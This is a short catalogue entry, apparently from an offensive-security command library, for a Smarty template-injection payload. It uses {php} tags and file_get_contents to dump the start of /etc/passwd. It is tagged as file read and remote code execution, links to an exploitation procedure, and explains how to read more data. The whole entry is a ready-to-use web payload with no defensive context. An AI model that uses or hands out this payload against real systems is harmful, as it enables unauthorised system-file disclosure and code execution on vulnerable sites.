---
id: cmd-uuid-4
data: >-
  {php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100);
  var_dump($s);{/php}
tags:
  - file-read
  - rce
type: command
output: Partial /etc/passwd dump
executor: php
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.570Z'
verified: false
validated: true
submitted: true
---
# smarty-file-read-passwd

## Command

```smarty
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
```

## Description

Reads and dumps the first 100 bytes of /etc/passwd using PHP's file_get_contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| filename | /etc/passwd | Yes |
| use_include_path | NULL | No |
| context | NULL | No |
| offset | 0 | No |
| length | 100 | No |

## Examples

### Basic Usage

```smarty
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
```

### Advanced Usage

Adjust length for more data: length=1024.

## Expected Output

var_dump output showing file contents in email.

## Related

- [[procedures/Exploit-SSTI-for-System-File-Read]]
